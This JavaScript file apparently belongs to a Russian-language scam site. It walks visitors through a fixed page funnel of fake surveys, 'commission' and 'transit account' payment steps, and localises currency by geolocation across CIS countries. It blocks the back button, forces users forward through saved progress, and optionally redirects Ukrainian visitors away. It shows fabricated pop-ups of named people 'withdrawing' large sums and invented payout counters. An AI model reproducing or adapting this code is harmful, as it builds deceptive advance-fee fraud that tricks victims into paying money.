var redirectLastPage = true;
var notUkraine = false;

var pageRedirect = 'https://www.google.com/';

var cookee_page_id;
var pages = [
    {id: 1, page: "index.html"},
    {id: 2, page: "search.html"},
    {id: 3, page: "res-search.html"},
    {id: 4, page: "op-wait1.html"},
    {id: 5, page: "opros-id1.html"},
    {id: 6, page: "op-wait2.html"},
    {id: 7, page: "opros-id2.html"},
    {id: 8, page: "op-wait3.html"},
    {id: 9, page: "opros-id3.html"},
    {id:10, page: "op-wait4.html"},
    {id:11, page: "opros-id4.html"},
    {id:12, page: "op-wait5.html"},
    {id:13, page: "opros-id5.html"},
    {id:14, page: "op-wait6.html"},
    {id:15, page: "opros-id6.html"},
    {id:16, page: "op-wait7.html"},
    {id:17, page: "op-wait8.html"},
    {id:18, page: "op-wait9.html"},
    {id:19, page: "limit-pay.html"},
    {id:20, page: "requisit.html"},
    {id:21, page: "connect-pay.html"},
    {id:22, page: "money-trans-fh42ng.html"},
    {id:23, page: "t-commiss.html"},
    {id:24, page: "m-transfer.html"},
    {id:25, page: "transit-account.html"},
    {id:26, page: "transit-account-en.html"},
    {id:27, page: "inventorying.html"},
    {id:28, page: "booking-transit.html"},
    {id:29, page: "wait-activat.html"},
    {id:30, page: "wait-sig.html"},
    {id:31, page: "conf-pers-signature.html"},
    {id:32, page: "wait-identificat.html"},
    {id:33, page: "ren-auto.html"},
    {id:34, page: "limit_ex.html"},
    {id:35, page: "trans_app.html"},
    {id:36, page: "final.html"}
];




var moneyCountryData = [{
    country: "Росиия",
    code: 'RUB',
    kurs: 1,
    dollar: 62.78,
    textMoney1: ["русские рубли", "рубли"],
    pre: ["руб", "рублей", "рубль", "рубля", "рубля", "рубля", "рублей", "рублей", "рублей", "рублей", "рублей"]
},{
    country: "Украина",
    code: 'UAH',
    kurs: 0.42,
    dollar: 26.78,
    textMoney1: ["украинские гривны", "гривны"],
    pre: ["грн", "гривен", "гривна", "гривны", "гривны", "гривны", "гривен", "гривен", "гривен", "гривен", "гривен"]
},{
    country: "Казахстан",
    code: 'KZT',
    kurs: 5.29,
    dollar: 346.82,
    textMoney1: ["казахские тенге", "тенге"],
    pre: ["тенге", "тенге", "тенге", "тенге", "тенге", "тенге", "тенге", "тенге", "тенге", "тенге", "тенге"]
},{
    country: "Белоруссия",
    code: 'BYN',
    kurs: 0.03217,
    dollar: 2.026,
    textMoney1: ["белорусские рубли", "рубли"],
    pre: ["руб", "рублей", "рубль", "рубля", "рубля", "рубля", "рублей", "рублей", "рублей", "рублей", "рублей"]
},{
    country: "Молдавия",
    code: 'MDL',
    kurs: 0.2695,
    dollar: 16.97,
    textMoney1: ["молдавские леи", "леи"],
    pre: ["лей", "леев", "лей", "лея", "лея", "лея", "леев", "леев", "леев", "леев", "леев"]
},{
    country: "Азербайджан",
    code: 'AZN',
    kurs: 0.0277,
    dollar: 1.744,
    textMoney1: ["азербайджанские манаты", "манаты"],
    pre: ["ман", "манатов", "манат", "маната", "маната", "маната", "манатов", "манатов", "манатов", "манатов", "манатов"]
},{
    country: "Армения",
    code: 'AMD',
    kurs: 7.671,
    dollar: 483,
    textMoney1: ["армянские драмы", "драмы"],
    pre: ["драм", "драмов", "драм", "драма", "драма", "драма", "драмов", "драмов", "драмов", "драмов", "драмов"]
},{
    country: "Киргизия",
    code: 'KGS',
    kurs: 1.084,
    dollar: 68.26,
    textMoney1: ["киргизские сомы", "сомы"],
    pre: ["сом", "сомов", "сом", "сома", "сома", "сома", "сомов", "сомов", "сомов", "сомов", "сомов"]
},{
    country: "Таджикистан",
    code: 'TJS',
    kurs: 0.1511,
    dollar: 9.514,
    textMoney1: ["таджикистанские сомони", "сомони"],
    pre: ["сом", "сомони", "сомони", "сомони", "сомони", "сомони", "сомони", "сомони", "сомони", "сомони", "сомони"]
},{
    country: "Туркмения",
    code: 'TMT',
    kurs: 0.0554,
    dollar: 3.489,
    textMoney1: ["туркменские манаты", "манаты"],
    pre: ["m", "манатов", "манат", "маната", "маната", "маната", "манатов", "манатов", "манатов", "манатов", "манатов"]
},{
    country: "Узбекистан",
    code: 'UZS',
    kurs: 124.6,
    dollar: 7849,
    textMoney1: ["узбекистанские сумы", "сумы"],
    pre: ["сўм", "сумов", "сум", "сума", "сума", "сума", "сумов", "сумов", "сумов", "сумов", "сумов"]
},{
    country: "Грузия",
    code: 'GEL',
    kurs: 0.040,
    dollar: 2.49,
    textMoney1: ["грузинские лари", "лари"],
    pre: ["лари", "лари", "лари", "лари", "лари", "лари", "лари", "лари", "лари", "лари", "лари"]
}];


function updateMoney() {
    $('.sMoney').each(
        function(i, elem){
            $(this).text(getMoney($(this).text()));
        }
    );
    $('.sMoney2').each(
        function(i, elem){
            $(this).text(getMoney($(this).text(), 1));
        }
    );
    uprBonus(0);
    
    if (localStorage["country"] == 'Украина' && notUkraine) {
        window.location.href = pageRedirect;
        document.location = pageRedirect;
    }
}
function getMoney(money, preVal = 0) {
    if (typeof money != "number")
        money = parseInt(money.replace(/[^0-9.,]/gim, ''));
    
    for(var i = 0 ; i < moneyCountryData.length ; i++) {
        if (localStorage["country"] == moneyCountryData[i].country) {
            var money = Math.floor(money * moneyCountryData[i].kurs).toString();
            if (preVal > 0)
                preVal = parseInt(money.substr(money.length - 1, 1)) + 1;
            return money.replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ') + ' ' + moneyCountryData[i].pre[preVal];
        }
    }
    var money = Math.floor(money * moneyCountryData[0].kurs).toString();
    if (preVal > 0)
        preVal = parseInt(money.substr(money.length - 1, 1)) + 1;
    return money.replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ') + ' ' + moneyCountryData[0].pre[preVal];
}
function writeMoney(money, preVal = 0) {
    return document.write(getMoney(money, preVal));
}



function setCookie(name, value, days) {
    localStorage[name] = value;
}

function readCookie(name) {
    if (localStorage[name] == undefined) {
        return null;
    }
    else
        return parseInt(localStorage[name]);
}


function redirectPage(page_idLocal) {
    var page = '';
	
	
	if (page_idLocal > pages.length) {
		page_idLocal = pages.length;
        setCookie('page_id', page_idLocal, 30);
	}
	else if (page_idLocal < 1) {
		page_idLocal = 1;
        setCookie('page_id', page_idLocal, 30);
	}
	
	
    for (var i = 0; i < pages.length; i++) {
        if (pages[i].id == page_idLocal) {
            page = pages[i].page;
            break;
        }
    }
	if (redirectLastPage) {
		window.location.href = page;
		document.location = page;
	}
    
    // location.reload();
}

function load() {
    cookee_page_id = readCookie('page_id');
    if(cookee_page_id == null) {
        setCookie('page_id', page_id, 30);
    }
    // console.log(cookee_page_id);
}

function init() {
    if(cookee_page_id != null) {
        if(+page_id < +cookee_page_id) {
            redirectPage(cookee_page_id);
  		}
  		if(+page_id > +cookee_page_id) {
  			setCookie('page_id', page_id, 30);
        }
    }
}

window.onload = function() {
    load(),
    init();
    
    
    
    
    var idStatictics = 1;
    setInterval(function() {
        var iMax = 0;
        $('.statisticsHeader .oneP').each(function(i, el) {
            if (idStatictics == iMax) {
                $(el).removeClass('animated fadeOutUp');
                $(el).addClass('animated fadeInUp');
                $(el).css('display', 'block');
            }
            else {
                $(el).removeClass('animated fadeInUp');
                $(el).addClass('animated fadeOutUp');
            }
            iMax++;
        });
        idStatictics++;
        if (idStatictics >= iMax)
            idStatictics = 0;
    }, 6000);
    
    
    if (localStorage["country"] != ymaps.geolocation.country) {
        
        localStorage["country"] = ymaps.geolocation.country;
        updateMoney();
    }
};
load();
init();

history.pushState(null, null, location.href);
window.onpopstate = function(event) {
    history.go(1);
}; 



function buttonH(elID) {
    var destination = $('#' + elID).offset().top - 150;

    $('html, body').animate({ scrollTop: destination }, 2000);
    return false;
}

var waitTUpdateVal = 0;
function waitTUpdate() {
    if (waitTUpdateVal == 1)
        $('.pointsSC').text('..');
    else if (waitTUpdateVal == 2)
        $('.pointsSC').text('...');
    else {
        waitTUpdateVal = 0;
        $('.pointsSC').text('.');
    }
    waitTUpdateVal++;
    return setTimeout("waitTUpdate()", 700);
}
waitTUpdate();

function getCodeCountry() {
    for(var i = 0 ; i < moneyCountryData.length ; i++) {
        if (localStorage["country"] == moneyCountryData[i].country) {
            return moneyCountryData[i].code;
        }
    }
    return moneyCountryData[0].code;
}
function getTextCountryMoney1(textID) {
    for(var i = 0 ; i < moneyCountryData.length ; i++) {
        if (localStorage["country"] == moneyCountryData[i].country) {
            return moneyCountryData[i].textMoney1[textID];
        }
    }
    return moneyCountryData[0].textMoney1[textID];
}









var notificationHideTime = 5000; // Время жизни уведомлений. В миллисекундах
var notificationInterval = 15000; // Интервал доваления уведомлений. В миллисекундах
var vipMoneyStart = 34668383; // Стартовое количество выплаченых денег
var vipBonusStart = 76; // Стартовое количество выплаченых бонусов
var moneyNotIn = [60000, 150000];
var mDataNotification = [{
    name: 'Самсонов Ярослав'
},{
    name: 'Виноградов Илья'
},{
    name: 'Некрасов Давид'
},{
    name: 'Гришин Жигер'
},{
    name: 'Князев Трофим'
},{
    name: 'Назаров Вениамин'
},{
    name: 'Сысоев Иосиф'
},{
    name: 'Кононов Альберт'
},{
    name: 'Стрелков Платон'
},{
    name: 'Лаврентьев Гарри'
},{
    name: 'Турова Зинаида'
},{
    name: 'Быкова Наталья'
},{
    name: 'Шарова София'
},{
    name: 'Ермакова Алла'
},{
    name: 'Баранова Инна'
},{
    name: 'Николаева Майя'
},{
    name: 'Рябова Лада'
},{
    name: 'Мартынова Ева'
},{
    name: 'Евсеева Злата'
},{
    name: 'Носова Искра'
},{
    name: 'Морозов Леопольд'
},{
    name: 'Горбунов Прохор'
},{
    name: 'Кузьмин Эрик'
},{
    name: 'Фомичёв Спартак'
},{
    name: 'Воробьёв Иосиф'
},{
    name: 'Ильин Трофим'
},{
    name: 'Лапина Альбина'
},{
    name: 'Прохорова Нелли'
},{
    name: 'Мартынова Эмилия'
},{
    name: 'Дорофеева Ольга'
},{
    name: 'Фомичёва Диана'
},{
    name: 'Калашникова Кристина'
},{
    name: 'Исаева Альбина'
}];


var notificationDiv = $('<div class="notificationNewTH"><img src="img/coin.gif"><span></span><img src="img/coin.gif"></div>');
notificationDiv.appendTo('html');

// notificationDiv.click(function(){notificationHide()});

var notificationHideShow = false;
var notificationHideInt = 0;
function notificationShow(name, money) {
	notificationHideInt++;
	notificationHideShow = true;
	notificationDiv.find('span').html('Пользователь <strong>' + name + '</strong> вывел(а) <strong>'  + getMoney(money) + '</strong>');
	notificationDiv.addClass('show');
	if (notificationHideTime > 0)
	{
		var lid = notificationHideInt;
		setTimeout(function(){notificationHide(lid);}, notificationHideTime);
	}
	return 1;
}
function notificationHide(iIBH) {
	if (notificationHideInt == iIBH || iIBH == 0 || iIBH == undefined)
	{
		notificationDiv.removeClass('show');
		notificationHideShow = false;
		return 1;
	}
	else
	{
		return 0;
	}
}

var isAddNotificationPage = false;
function addNotificationPage() {
    var time =  notificationInterval + (notificationInterval / 2) * Math.random();
    var id = Math.round(mDataNotification.length * Math.random());
    if (id >= mDataNotification.length)
        id = mDataNotification.length - 1;
    
    var name = mDataNotification[id].name;
    var money = Math.round(moneyNotIn[0] + ((moneyNotIn[1] - moneyNotIn[0]) * Math.random()));
    
    if (!isAddNotificationPage) {
        isAddNotificationPage = true;
    }
    else {
        if (uprBonus(money))
            notificationShow(name, money);
    }
    setTimeout("addNotificationPage()", time);
}

function uprBonus(money = 0) {
    var b = parseInt(localStorage['upriBonus']);
    var m = parseInt(localStorage['upriMoney']);
    var r = true;
    
    if (!(b >= 1 && b < vipBonusStart))
        b = vipBonusStart;
    
    if (!(m >= vipMoneyStart && m < vipMoneyStart * 10))
        m = vipMoneyStart;
    
    if (b > 1) {
        if (money > 0) {
            b--;
            m += money;
        }
    }
    else {
        r = false;
    }
    $('.upriBonus').text(b);
    $('.upriMoney').text(getMoney(m));
    
    localStorage['upriBonus'] = b;
    localStorage['upriMoney'] = m;
    
    return r;
}